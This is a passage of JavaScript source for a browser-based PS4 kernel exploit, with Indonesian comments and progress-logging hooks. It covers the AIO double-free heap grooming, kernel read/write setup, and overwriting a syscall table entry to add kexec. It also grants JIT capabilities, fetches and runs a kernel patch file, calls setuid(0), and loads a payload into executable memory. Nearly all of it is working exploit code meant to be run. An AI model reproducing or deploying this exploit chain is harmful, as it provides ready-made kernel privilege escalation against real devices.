    kmem.write64(r_rthdr_p, 0);
    log(`reclaim rthdr: ${kmem.read64(r_rthdr_p)}`);

    const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
    log(`reclaim rthdr: ${kmem.read64(w_rthdr_p)}`);
    log(kmem.read64(w_rthdr_p));
    log(`reclaim rthdr: ${kmem.read64(w_rthdr_p)}`);

    log('corrupt pointers cleaned');


    // REMOVE once restore kernel is ready for production
    // increase the ref counts to prevent deallocation
    kmem.write32(main_sock, kmem.read32(main_sock) + 1);
    kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
    // +2 since we have to take into account the fget_write()'s reference
    kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);


    // Simpan w_pktinfo untuk digunakan nanti
    const w_pktinfo = w_pktopts.add(0x10);
    return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
}

// FUNCTIONS FOR STAGE: PATCH KERNEL

async function get_patches(url) {
    const response = await fetch(url);
    if (!response.ok) {
        throw Error(
            `Network response was not OK, status: ${response.status}\n`
            + `failed to fetch: ${url}`);
    }
    return response.arrayBuffer();
}

// 9.00 supported only
async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
    if (!is_ps4) {
        throw RangeError('PS5 kernel patching unsupported');
    }
    if (!(0x800 <= version < 0x900)) {
        throw RangeError('kernel patching unsupported');
    }

    log('change sys_aio_submit() to sys_kexec()');
    // sysent[661] is unimplemented so free for use
    const offset_sysent_661 = 0x1107f00;
    const sysent_661 = kbase.add(offset_sysent_661);
    // .sy_narg = 6
    kmem.write32(sysent_661, 6);
    // .sy_call = gadgets['jmp qword ptr [rsi]']
    kmem.write64(sysent_661.add(8), kbase.add(0x4c7ad));
    // .sy_thrcnt = SY_THR_STATIC
    kmem.write32(sysent_661.add(0x2c), 1);

    log('add JIT capabilities');
    // TODO just set the bits for JIT privs
    // cr_sceCaps[0]
    kmem.write64(p_ucred.add(0x60), -1);
    // cr_sceCaps[1]
    kmem.write64(p_ucred.add(0x68), -1);

    const buf = await get_patches('./kpatch/900.elf');
    // FIXME handle .bss segment properly
    // assume start of loadable segments is at offset 0x1000
    const patches = new View1(buf, 0x1000);
    let map_size = patches.size;
    const max_size = 0x10000000;
    if (map_size > max_size) {
        die(`patch file too large (>${max_size}): ${map_size}`);
    }
    if (map_size === 0) {
        die('patch file size is zero');
    }
    map_size = map_size+page_size & -page_size;

    const prot_rwx = 7;
    const prot_rx = 5;
    const prot_rw = 3;
    const exec_p = new Int(0, 9);
    const write_p = new Int(max_size, 9);
    const exec_fd = sysi('jitshm_create', 0, map_size, prot_rwx);
    const write_fd = sysi('jitshm_alias', exec_fd, prot_rw);

    const exec_addr = chain.sysp(
        'mmap',
        exec_p,
        map_size,
        prot_rx,
        MAP_SHARED|MAP_FIXED,
        exec_fd,
        0,
    );
    const write_addr = chain.sysp(
        'mmap',
        write_p,
        map_size,
        prot_rw,
        MAP_SHARED|MAP_FIXED,
        write_fd,
        0,
    );

    log(`exec_addr: ${exec_addr}`);
    log(`write_addr: ${write_addr}`);
    if (exec_addr.ne(exec_p) || write_addr.ne(write_p)) {
        die('mmap() for jit failed');
    }

    log('mlock exec_addr for kernel exec');
    sysi('mlock', exec_addr, map_size);

    // mov eax, 0x1337; ret (0xc300_0013_37b8)
    const test_code = new Int(0x001337b8, 0xc300);
    write_addr.write64(0, test_code);

    log('test jit exec');
    sys_void('kexec', exec_addr);
    let retval = chain.errno;
    log('returned successfully');

    log(`jit retval: ${retval}`);
    if (retval !== 0x1337) {
        die('test jit exec failed');
    }

    const pipe_save = restore_info[1];
    restore_info[1] = pipe_save.addr;
    log('mlock pipe save data for kernel restore');
    sysi('mlock', restore_info[1], page_size);

    mem.cpy(write_addr, patches.addr, patches.size);
    sys_void('kexec', exec_addr, ...restore_info);

    log('setuid(0)');
    sysi('setuid', 0);
    log('kernel exploit succeeded!');

    // Kirim log status eksploitasi yang jelas untuk penandaan folder log
    log('EXPLOIT_STATUS: SUCCESS - Kernel exploit berhasil');

    updateUIStatus('success', 'Kernel exploit berhasil!');
    updateUIProgress('complete', 100);

    // Trigger event untuk menandai exploit selesai
    window.dispatchEvent(new Event('exploitComplete'));

    // Hapus alert untuk mencegah refresh otomatis browser PS4
    // alert("kernel exploit succeeded!");
}

// FUNCTIONS FOR STAGE: SETUP

function setup(block_fd) {
    // this part will block the worker threads from processing entries so that
    // we may cancel them instead. this is to work around the fact that
    // aio_worker_entry2() will fdrop() the file associated with the aio_entry
    // on ps5. we want aio_multi_delete() to call fdrop()
    log('block AIO');
    const reqs1 = new Buffer(0x28 * num_workers);
    const block_id = new Word();

    for (let i = 0; i < num_workers; i++) {
        reqs1.write32(8 + i*0x28, 1);
        reqs1.write32(0x20 + i*0x28, block_fd);
    }
    aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);

    {
        const reqs1 = make_reqs1(1);
        const timo = new Word(1);
        const id = new Word();
        aio_submit_cmd(AIO_CMD_READ, reqs1.addr, 1, id.addr);
        chain.do_syscall_clear_errno(
            'aio_multi_wait', id.addr, 1, _aio_errors_p, 1, timo.addr);
        const err = chain.errno;
        if (err !== 60) { // ETIMEDOUT
            die(`SceAIO system not blocked. errno: ${err}`);
        }
        free_aios(id.addr, 1);
    }

    log('heap grooming');
    // chosen to maximize the number of 0x80 malloc allocs per submission
    const num_reqs = 3;
    const groom_ids = new View4(num_grooms);
    const groom_ids_p = groom_ids.addr;
    const greqs = make_reqs1(num_reqs);
    // allocate enough so that we start allocating from a newly created slab
    spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids_p, false);
    cancel_aios(groom_ids_p, num_grooms);
    return [block_id, groom_ids];
}

// overview:
// * double free a aio_entry (resides at a 0x80 malloc zone)
// * type confuse a evf and a ip6_rthdr
// * use evf/rthdr to read out the contents of the 0x80 malloc zone
// * leak a address in the 0x100 malloc zone
// * write the leaked address to a aio_entry
// * double free the leaked address
// * corrupt a ip6_pktopts for restricted r/w
// * corrupt a pipe for arbitrary r/w
//
// the exploit implementation also assumes that we are pinned to one core
// Function to update UI progress
function updateUIProgress(stage, percent) {
    // Kirim log ke remote logger jika tersedia
    if (window.RemoteLogger) {
        window.RemoteLogger.logStage(stage, percent);
    }

    document.dispatchEvent(new CustomEvent('exploitProgress', {
        detail: {
            stage: stage,
            percent: percent
        }
    }));
}

// Function to update UI status
function updateUIStatus(status, message) {
    // Kirim log ke remote logger jika tersedia
    if (window.RemoteLogger) {
        if (status === 'running') {
            window.RemoteLogger.info(message);
        } else if (status === 'success') {
            window.RemoteLogger.info(`SUCCESS: ${message}`);
        } else if (status === 'error') {
            window.RemoteLogger.error(`ERROR: ${message}`);
        }
    }

    document.dispatchEvent(new CustomEvent('exploitStatus', {
        detail: {
            status: status,
            message: message
        }
    }));
}

export async function kexploit() {
    updateUIStatus('running', 'Initializing exploit...');
    updateUIProgress('init', 5);

    // Log konfigurasi yang digunakan
    log(`Using exploit configuration: num_alias=${num_alias}, num_races=${num_races}, delay_ms=${delay_ms}`);

    // Log informasi browser dan sistem
    log(`User Agent: ${navigator.userAgent}`);
    log(`Memory: ${getMemoryUsage()}`);
    log(`Thread ID: ${thread_id()}`);
    log(`Screen: ${window.screen.width}x${window.screen.height}`);
    log(`Language: ${navigator.language}`);
    log(`Online: ${navigator.onLine}`);

    // Tambahkan delay awal untuk stabilitas
    sleep(100);

    // Setup deteksi hang
    setupHangDetection();

    const _init_t1 = performance.now();
    try {
        await init();
    } catch (e) {
        log(`Error during initialization: ${e.message}`);
        updateUIStatus('error', `Initialization failed: ${e.message}`);
        throw e;
    }
    const _init_t2 = performance.now();

    updateUIProgress('init', 10);

    // If setuid is successful, we dont need to run the kexploit again
    try {
        if (sysi('setuid', 0) == 0) {
            log("Not running kexploit again.")
            updateUIStatus('success', 'Already exploited. Not running again.');
            return;
        }
    }
    catch (e) {}

    // fun fact:
    // if the first thing you do since boot is run the web browser, WebKit can
    // use all the cores
    const main_mask = new Long();
    get_our_affinity(main_mask);
    log(`main_mask: ${main_mask}`);

    // pin to 1 core so that we only use 1 per-cpu bucket. this will make heap
    // spraying and grooming easier
    log(`pinning process to core #${main_core}`);
    set_our_affinity(new Long(1 << main_core));
    get_our_affinity(main_mask);
    log(`main_mask: ${main_mask}`);

    log("setting main thread's priority");
    sysi('rtprio_thread', RTP_SET, 0, rtprio.addr);

    const [block_fd, unblock_fd] = (() => {
        const unix_pair = new View4(2);
        sysi('socketpair', AF_UNIX, SOCK_STREAM, 0, unix_pair.addr);
        return unix_pair;
    })();

    const sds = [];
    for (let i = 0; i < num_sds; i++) {
        sds.push(new_socket());
    }

    let block_id = null;
    let groom_ids = null;
    try {
        log('STAGE: Setup');
        updateUIStatus('running', 'Setting up exploit environment...');
        updateUIProgress('setup', 20);
        [block_id, groom_ids] = setup(block_fd);

        log('\nSTAGE: Double free AIO queue entry');
        updateUIStatus('running', 'Exploiting AIO queue entry...');
        updateUIProgress('double_free_1', 30);
        const sd_pair = double_free_reqs2(sds);

        log('\nSTAGE: Leak kernel addresses');
        updateUIStatus('running', 'Leaking kernel addresses...');
        updateUIProgress('leak', 45);
        const [
            reqs1_addr, kbuf_addr, kernel_addr, target_id, evf,
        ] = leak_kernel_addrs(sd_pair);

        log('\nSTAGE: Double free SceKernelAioRWRequest');
        updateUIStatus('running', 'Exploiting SceKernelAioRWRequest...');
        updateUIProgress('double_free_2', 60);
        const [pktopts_sds, dirty_sd] = double_free_reqs1(
            reqs1_addr, kbuf_addr, target_id, evf, sd_pair[0], sds,
        );

        log('\nSTAGE: Get arbitrary kernel read/write');
        updateUIStatus('running', 'Gaining kernel read/write access...');
        updateUIProgress('kernel_rw', 75);
        const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(
            pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);

        log('\nSTAGE: Patch kernel');
        updateUIStatus('running', 'Patching kernel...');
        updateUIProgress('patch', 90);

        await patch_kernel(kbase, kmem, p_ucred, restore_info);

    } catch (e) {
        // Tangkap error dan log
        log(`Exploit failed: ${e.message}`);

        // Re-throw error untuk penanganan di tempat lain
        throw e;
    } finally {
        close(unblock_fd);

        const t2 = performance.now();
        const ftime = t2 - t1;
        const init_time = _init_t2 - _init_t1;
        log('\ntime (include init): ' + (ftime) / 1000);
        log('kex time: ' + (t2 - _init_t2) / 1000);
        log('init time: ' + (init_time) / 1000);
        log('time to init: ' + (_init_t1 - t1) / 1000);
        log('time - init time: ' + (ftime - init_time) / 1000);
    }

    // Cleanup resources
    close(block_fd);
    free_aios2(groom_ids.addr, groom_ids.length);
    aio_multi_wait(block_id.addr, 1);
    aio_multi_delete(block_id.addr, block_id.length);
    for (const sd of sds) {
        close(sd);
    }

    // Log sukses
    log('Kernel exploit completed successfully!');
    updateUIStatus('success', 'Kernel exploit berhasil!');
}

// Fungsi untuk membersihkan pointer yang corrupt
function cleanupCorruptPointers() {
    try {
        log("Cleaning up corrupt pointers...");

        // Coba paksa garbage collection
        if (typeof gc === 'function') {
            gc();
            log("Garbage collection triggered");
        }

        // Alokasikan beberapa objek untuk membantu stabilitas memori
        const stabilizers = [];
        for (let i = 0; i < 20; i++) {
            stabilizers.push(new ArrayBuffer(1024));
        }

        // Tambahkan delay untuk memastikan garbage collection selesai
        sleep(500);

        log("Corrupt pointers cleaned");
    } catch (e) {
        log(`Warning: Pointer cleanup failed: ${e.message}`);
    }
}

// Fungsi untuk menjalankan payload dengan penanganan error yang lebih baik
async function runPayload() {
    try {
        log("Preparing to run payload...");
        updateUIStatus('running', 'Mempersiapkan payload...');

        // Bersihkan pointer yang corrupt sebelum menjalankan payload
        cleanupCorruptPointers();

        // Tambahkan delay sebelum menjalankan payload
        await new Promise(resolve => setTimeout(resolve, 2000));

        // Periksa apakah payload tersedia
        if (!window.pld || window.pld.length === 0) {
            log("ERROR: Payload not loaded or empty");
            updateUIStatus('error', 'Payload tidak tersedia atau kosong');
            return;
        }

        log(`Payload size: ${window.pld.length} bytes`);

        // Alokasi memori untuk payload dengan alamat yang berbeda
        log("Allocating memory for payload...");
        // Gunakan alamat yang berbeda untuk menghindari konflik dengan memori kernel
        const payload_buffer = chain.sysp('mmap', new Int(0x27200000, 0x9), 0x300000, 7, 0x41000, -1, 0);

        // Periksa apakah payload_buffer valid
        if (!payload_buffer || payload_buffer.low === 0 && payload_buffer.high === 0) {
            log("ERROR: Failed to allocate memory for payload");
            updateUIStatus('error', 'Gagal mengalokasikan memori untuk payload');
            return;
        }

        log(`Allocated payload buffer at ${payload_buffer}`);

        // Buat view untuk payload
        const payload_loader = new View4(window.pld);
        log(`Payload view created with size: ${payload_loader.size} bytes`);

        // Ubah proteksi memori
        log("Setting memory protection...");
        chain.syscall_void('mprotect', payload_loader.addr, payload_loader.size, 7); // PROT_READ | PROT_WRITE | PROT_EXEC

        // Alokasi memori untuk thread context
        log("Creating thread context...");
        const ctx = new Buffer(0x10);
        const pthread = new Pointer();
        pthread.ctx = ctx;

        // Jalankan payload dalam thread terpisah
        log("Creating thread to run payload...");
        updateUIStatus('running', 'Menjalankan payload...');

        // Tambahkan delay sebelum pthread_create
        await new Promise(resolve => setTimeout(resolve, 1000)); // Tingkatkan dari 500ms ke 1000ms

        // Panggil pthread_create
        log("Calling pthread_create...");
        try {
            chain.call_void(
                'pthread_create',
                pthread.addr,
                0,
                payload_loader.addr,
                payload_buffer
            );
            log("pthread_create called successfully");

            // Tambahkan delay setelah pthread_create
            await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (e) {
            log(`ERROR: pthread_create call failed: ${e.message}`);
            updateUIStatus('error', `Gagal membuat thread: ${e.message}`);
            return;
        }

        log("Payload thread created successfully");

        // Kirim log status eksploitasi yang jelas untuk penandaan folder log
        log('EXPLOIT_STATUS: SUCCESS - Payload berhasil dimuat');

        updateUIStatus('success', 'Payload berhasil dijalankan');

        // Tandai payload sebagai selesai
        payloadCompleted = true;

        // Trigger event untuk menandai payload selesai
        window.dispatchEvent(new Event('payloadComplete'));

        log("Payload completed successfully, no automatic refresh will be performed.");

    } catch (e) {
        log(`ERROR: Exception while running payload: ${e.message}`);
        updateUIStatus('error', `Error saat menjalankan payload: ${e.message}`);
    }
}

// Tambahkan event listener untuk payloadComplete
window.addEventListener('payloadComplete', () => {
    // Lakukan tindakan lain yang diperlukan, tetapi jangan refresh browser
    log("Payload completion event received");

    // Tampilkan pesan ke pengguna
    updateUIStatus('success', 'Exploit dan payload berhasil dijalankan. Tidak ada refresh otomatis.');
});

// Jalankan exploit dan kemudian payload
kexploit().then(() => {
    // Bersihkan pointer yang corrupt setelah exploit selesai
    cleanupCorruptPointers();

    // Tambahkan delay sebelum menjalankan payload
    setTimeout(() => {
        log("Exploit completed, preparing to run payload...");
        // Bersihkan pointer yang corrupt lagi sebelum menjalankan payload
        cleanupCorruptPointers();
        runPayload();
    }, 3000); // Tingkatkan delay dari 2 detik ke 3 detik
}).catch(e => {
    log(`ERROR: Exploit failed: ${e.message}`);
    updateUIStatus('error', `Exploit gagal: ${e.message}`);
});
